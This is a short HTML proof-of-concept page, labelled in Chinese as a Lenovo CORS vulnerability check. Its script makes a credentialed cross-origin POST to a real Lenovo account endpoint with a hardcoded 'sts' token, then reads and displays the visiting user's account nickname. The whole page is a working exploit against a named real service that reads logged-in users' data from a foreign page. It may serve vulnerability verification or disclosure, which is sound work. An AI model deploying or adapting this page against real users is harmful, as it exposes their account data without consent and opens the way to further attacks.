<!DOCTYPE html>
<html>
<head>
    <title>联想CORS漏洞验证</title>
</head>
<body>
    <h2>正在验证联想账号安全性...</h2>
    <div id="result">加载中...</div>
    <script>
    fetch('https://i.lenovo.com.cn/info/getPicNickName.jhtml', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'sts=e40e7004-4c8a-4963-8564-31271a8337d8'
    })
    .then(res => res.json())
    .then(data => {
        if (data.data && data.data.lenovoNickimg) {
            document.getElementById('result').innerHTML = '<p style="color:green">存在漏洞！您的昵称是：' + data.data.lenovoNickimg.nickName + '</p>';
        } else {
            document.getElementById('result').innerHTML = '<p>未获取到数据，但请求已发送。</p>';
        }
    })
    .catch(err => {
        document.getElementById('result').innerHTML = '<p>请求失败。错误：' + err + '</p>';
    });
    </script>
</body>
</html>
